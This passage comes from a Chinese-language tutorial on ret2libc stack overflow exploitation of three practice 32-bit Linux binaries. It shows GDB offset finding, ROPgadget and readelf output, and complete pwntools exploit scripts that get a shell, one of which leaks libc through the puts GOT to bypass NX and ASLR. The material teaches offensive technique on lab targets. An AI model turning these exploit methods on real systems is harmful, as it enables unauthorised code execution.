class="string">&#x27;/home/kali/Desktop/ret2libc1&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出，接着定位溢出值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 200</span><br><span class="line"><span class="string">&#x27;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&#x27;</span></span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/kali/Desktop/ret2libc1 </span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb0580 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xfbad2288 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EBP: 0x6941414d (<span class="string">&#x27;MAAi&#x27;</span>)</span><br><span class="line">ESP: 0xffffd220 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">EIP: 0x41384141 (<span class="string">&#x27;AA8A&#x27;</span>)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd220 (<span class="string">&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0004| 0xffffd224 (<span class="string">&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0008| 0xffffd228 (<span class="string">&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0012| 0xffffd22c (<span class="string">&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0016| 0xffffd230 (<span class="string">&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0020| 0xffffd234 (<span class="string">&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0024| 0xffffd238 (<span class="string">&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">0028| 0xffffd23c (<span class="string">&quot;RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure><p>可以看到溢出的位置在112的地方</p><p>接着利用<strong>ropgadget</strong>，查看是否有<code>/bin/sh</code>存在</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ ROPgadget --binary ret2libc1 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>并且在IDA中可以看到有<code>system</code>这个函数，如果没有开启ASRL的话再Windows上面看到的地址和你在Linux运行后的地址是相同的</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/12.png" alt="image-20201120115231916"></p><p>我们要的东西都齐了以后，接下来就是写EXP了，EXP中栈拼接对应上面的利用原理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;../ret2libc1&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/13.png" alt="image-20201120115749503"></p><p>payload在栈中的部署：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                              +---------------------------+</span><br><span class="line">                              |          binsh_addr       | 部署binsh_addr作为汇编system函数的参数</span><br><span class="line">              +-              +---------------------------+</span><br><span class="line">              | PUSH 返回地址  |           bbbb            | 部署bbbb作为汇编正常调用system函数的返回地址 </span><br><span class="line">call system &lt;-|               +---------------------------+</span><br><span class="line">              | JMP 函数地址   |        system_plt         | 执行system_plt，覆盖原ret返回位置</span><br><span class="line">              +-              +---------------------------+</span><br><span class="line">                              |           aaaa            | aaaa覆盖原ebp位置</span><br><span class="line">                       ebp---&gt;+---------------------------+</span><br><span class="line">                              |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">                              |           ....            |        ......</span><br><span class="line">                              |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">                              |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">                              |           aaaa            | aaaa占位填满栈空间</span><br><span class="line">                              +---------------------------+</span><br></pre></td></tr></table></figure><p>如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址（<strong>就是call指令下面的地址</strong>），而现在我们并不是正常调用，所以需要补上一个<code>bbbb</code>作为虚拟返回地址（<strong>也就是CALL指令拆分成两步中的第一步PUSH 返回地址</strong>）</p><hr><h4 id="只存在system-函数"><a href="#只存在system-函数" class="headerlink" title="只存在system()函数"></a>只存在system()函数</h4><p>以 bamboofox 中 ret2libc2为例，拿到文件依旧进行查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ret2libc2</span><br><span class="line">[*] <span class="string">&#x27;/home/ascotbe/Desktop/Pwn/ret2libc2&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>接着我们可以看到溢出函数依旧是上文中的那个并且<code>system()</code>的地址是<strong>0x08048490</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/14.png" alt="image-20201120142854442"></p><p>但是我们用ROPgadget并无找到<code>/bin/sh</code>位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --string <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure><p>那我们怎么获取字符串呢？我们在PLT表中可以看到有一个<code>gets()</code>函数，这个函数可以用来获取字符串，并且地址为<strong>0x08048460</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/15.png" alt="image-20201120144606722"></p><p>反汇编查看一下该函数</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/16.png" alt="image-20201120144720027"></p><p>发现传入一个指针后即可返回指针指向的字符串，那么接着我们只需要找到一个可读可写的buffer区，通常会寻找<code>.bss</code>段，通过<strong>readelf</strong>命令来查找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ readelf -S ret2libc2</span><br><span class="line">There are 35 section headers, starting at offset 0x1924:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481d8 0001d8 0000f0 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          080482c8 0002c8 000096 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804835e 00035e 00001e 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804837c 00037c 000030 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080483ac 0003ac 000018 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080483c4 0003c4 000058 08   A  5  12  4</span><br><span class="line">  [11] .init             PROGBITS        0804841c 00041c 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        08048440 000440 0000c0 04  AX  0   0 16</span><br><span class="line">  [13] .text             PROGBITS        08048500 000500 000242 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        08048744 000744 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        08048758 000758 000065 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        080487c0 0007c0 000034 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        080487f4 0007f4 0000d0 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [23] .got.plt          PROGBITS        0804a000 001000 000038 04  WA  0   0  4</span><br><span class="line">  [24] .data             PROGBITS        0804a038 001038 000008 00  WA  0   0  4</span><br><span class="line">  [25] .bss              NOBITS          0804a040 001040 0000a4 00  WA  0   0 32</span><br><span class="line">  [26] .comment          PROGBITS        00000000 001040 00002b 01  MS  0   0  1</span><br><span class="line">  [27] .debug_aranges    PROGBITS        00000000 00106b 000020 00      0   0  1</span><br><span class="line">  [28] .debug_info       PROGBITS        00000000 00108b 000329 00      0   0  1</span><br><span class="line">  [29] .debug_abbrev     PROGBITS        00000000 0013b4 0000f8 00      0   0  1</span><br><span class="line">  [30] .debug_line       PROGBITS        00000000 0014ac 0000c2 00      0   0  1</span><br><span class="line">  [31] .debug_str        PROGBITS        00000000 00156e 00026d 01  MS  0   0  1</span><br><span class="line">  [32] .shstrtab         STRTAB          00000000 0017db 000146 00      0   0  1</span><br><span class="line">  [33] .symtab           SYMTAB          00000000 001e9c 000540 10     34  50  4</span><br><span class="line">  [34] .strtab           STRTAB          00000000 0023dc 000314 00      0   0  1</span><br></pre></td></tr></table></figure><p>我们可以发现<strong>.bss</strong>是从<strong>0x0804a040</strong>的位置开始的，然后按着这个段找到了<strong>0x0804A080</strong>这个位置是个char数组</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/17.png" alt="image-20201120182503721"></p><p>接着可以看到<strong>.bss</strong>是能读写，由于程序在gdb中运行，就算关闭了ALSR也会和在gdb外运行不同。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop/Pwn$ gdb -q ret2libc2</span><br><span class="line">Reading symbols from ret2libc2...</span><br><span class="line">gdb-peda$ run </span><br><span class="line">Starting program: /home/kali/Desktop/Pwn/ret2libc2 </span><br><span class="line">Something surprise here, but I don<span class="string">&#x27;t think it will work.</span></span><br><span class="line"><span class="string">What do you think ?</span></span><br><span class="line"><span class="string">[Inferior 1 (process 10047) exited normally]</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">gdb-peda$ vmmap</span></span><br><span class="line"><span class="string">Warning: not running</span></span><br><span class="line"><span class="string">Start      End        Perm      Name</span></span><br><span class="line"><span class="string">0x0804841c 0x08048758 rx-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08048154 0x080488c4 r--p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br><span class="line"><span class="string">0x08049f08 0x0804a0e4 rw-p      /home/kali/Desktop/Pwn/ret2libc2</span></span><br></pre></td></tr></table></figure><p>接着寻找<code>add esp, 4</code>这样的指令，至于为什么呢因为我们调用gets()函数的时候push了一个参数也就是<code>/bin/sh</code>，函数结束的话如果不让堆栈平衡，那么最后结束整个函数的时候ebp的值回比原来低，具体低4个字节还是8个看进程的位数去。最后在这题结束会放个c程序调试的例子作为解释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ ROPgadget --binary ret2libc2 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0804872f : pop ebp ; ret</span><br><span class="line">0x0804872c : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br><span class="line">0x0804872e : pop edi ; pop ebp ; ret</span><br><span class="line">0x0804872d : pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x08048426 : ret</span><br><span class="line">0x0804857e : ret 0xeac1</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 7</span><br></pre></td></tr></table></figure><p>万事具备我们就直接构造EXP即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./ret2libc2&quot;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_gets_addr = <span class="number">0x08048460</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804843d</span></span><br><span class="line">payload = flat([<span class="string">&quot;A&quot;</span> * <span class="number">0x70</span>, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, <span class="string">&#x27;6666&#x27;</span>, buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行流程</span></span><br><span class="line">PUSH 参数-&gt;PUSH 返回地址-&gt;JMP system函数地址-&gt;PUSH 参数（进入CALL调用栈中）-&gt;POP 参数(由于为了堆栈平衡之前PUSH了参数)-&gt;CALL gets函数</span><br><span class="line"><span class="comment">#伪C++代码类似下面</span></span><br><span class="line">system(gets(*buf2))</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/18.png" alt="image-20201120190619022"></p><p>关于栈的分布图</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/19.png" alt="19"></p><hr><h4 id="无system-函数和-bin-sh字符串"><a href="#无system-函数和-bin-sh字符串" class="headerlink" title="无system()函数和/bin/sh字符串"></a>无system()函数和/bin/sh字符串</h4><p>首先查看保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~/Desktop/Pwn$ checksec ./ret2libc3</span><br><span class="line">[*] <span class="string">&#x27;/home/ascotbe/Desktop/Pwn/ret2libc3&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以发现是加载<strong>libc.so</strong>动态链接库的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ i sharedlibrary </span><br><span class="line">From        To          Syms Read   Shared Object Library</span><br><span class="line"><span class="number">0xf7fd2100</span>  <span class="number">0xf7fef7f3</span>  Yes (*)     /lib/ld-linux.so<span class="number">.2</span></span><br><span class="line"><span class="number">0xf7de81d0</span>  <span class="number">0xf7f4171a</span>  Yes (*)     /lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">(*): Shared library is missing debugging information.</span><br></pre></td></tr></table></figure><p>可以发现没有<code>system()</code>函数和<code>/bin/sh</code>字符串了</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/20.png" alt="image-20201121103715703"></p><p>由于他加载了<strong>libc.so</strong>，那么我们可以明确几点</p><ul><li><p>动态链接库中的函数之间相对偏移是固定的</p></li><li><p>A 真实地址 (内存物理地址) - A 偏移地址 = B 真实地址 (内存物理地址) -B 偏移地址 = 基地址</p></li><li><p>如果我们知道<strong>libc.so</strong>中某个函数的地址，那么我们就可以确定该程序利用的<strong>libc.so</strong>。进而我们就可以知道<code>system()</code>函数的地址。通过<code>puts()</code>泄露某个已执行过的函数的GOT地址，并且返回地址设置为_start()或main()，以便于重新执行一遍程序；</p></li></ul><p>简单地说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。</p><p>我们可以看下本题的_start()函数内容，其包含main()和__libc_start_main()函数的调用，也就是说，它才是程序真正的入口</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/22.png" alt="img"></p><p>那么我们就可以编写EXP了，这个EXP就算开启了ASLR的话都是狂野利用的，所以我们这边绕过了<strong>NX</strong>保护和<strong>ASLR</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc3&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;x86&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start_addr = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]puts plt: &quot;</span> + <span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]puts got: &quot;</span> + <span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]_start addr: &quot;</span> + <span class="built_in">hex</span>(start_addr))</span><br><span class="line">print( <span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload1 to leak libc...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&quot;A&quot;</span> * <span class="number">112</span>, puts_plt, start_addr, puts_got])<span class="comment">#把puts_got地址放到栈中参数位置</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Can you find it !?&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(sh.recv(<span class="number">4</span>))<span class="comment">#获取到输出的值，里面带有我们放入的puts_got地址</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak puts addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]<span class="comment">#获取相对偏移</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]<span class="comment">#</span></span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]leak libc addr: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]system addr: &quot;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]binsh addr: &quot;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;--&quot;</span> * <span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;[*]sending payload2 to getshell...&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = flat([<span class="string">&quot;B&quot;</span> * <span class="number">112</span>, system_addr, <span class="string">&quot;CCCC&quot;</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><img 